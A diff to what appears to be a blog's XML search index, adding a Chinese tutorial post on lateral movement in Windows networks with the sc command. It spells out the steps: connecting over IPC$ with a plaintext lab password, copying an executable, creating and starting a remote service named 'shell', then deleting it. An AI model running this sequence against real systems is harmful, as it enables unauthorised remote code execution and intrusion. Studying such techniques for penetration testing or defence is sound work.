@@ -4,7 +4,32 @@
   
     
     <entry>
-      <title>IPC连接</title>
+      <title>利用windows服务之SC进行横向</title>
+      <link href="/2022/11/02/sc/"/>
+      <url>/2022/11/02/sc/</url>
+      
+        <content type="html"><![CDATA[<h3 id="0x01-前言">0x01 前言</h3><blockquote><p>利用windows服务进行横向渗透主要是通过sc命令，但是注意这里跟之前windows远程命令相比多了一个条件，即当前主机需要为administrator权限。</p></blockquote><h3 id="0x02-sc命令">0x02 sc命令</h3><blockquote><p>sc命令是XP系统中功能强大的DOS命令,SC命令能与“服务控制器”和已安装设备进行通讯。SC是用于与服务控制管理器和服务进行通信的命令行程序。</p></blockquote><p>利用sc命令进行横向渗透的大体流程如下：</p><p>1.与靶机建立ipc连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.10.7\ipc$ &quot;1qaz@WSX&quot; /user:fzm\user1</span><br></pre></td></tr></table></figure><img src="/2022/11/02/sc/image-20221102101445322.png" alt="image-20221102101445322" style="zoom:50%;"><p>2.拷贝exe到主机系统上</p><img src="/2022/11/02/sc/image-20221102101459585.png" alt="image-20221102101459585" style="zoom:50%;"><p>3.在靶机上创建一个shell的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\win7 create shell binpath= &quot;c:\abc.exe&quot;</span><br></pre></td></tr></table></figure><img src="/2022/11/02/sc/image-20221102101801488.png" alt="image-20221102101801488" style="zoom:50%;"><p>4.启动shell服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\win7 start shell</span><br></pre></td></tr></table></figure><img src="/2022/11/02/sc/image-20221102102032987.png" alt="image-20221102102032987" style="zoom:50%;"><p>成功上线</p><p><img src="/2022/11/02/sc/image-20221102101922849.png" alt="image-20221102101922849"></p><p>5.删除创建的shell服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\win7 delete shell</span><br></pre></td></tr></table></figure><img src="/2022/11/02/sc/image-20221102102117550.png" alt="image-20221102102117550" style="zoom:50%;">]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 横向移动 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>利用IPC进行横向</title>
       <link href="/2022/11/01/ipc/"/>
       <url>/2022/11/01/ipc/</url>
       
@@ -388,12 +413,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 内网基础 </tag>
-            
-        </tags>
       
     </entry>
     
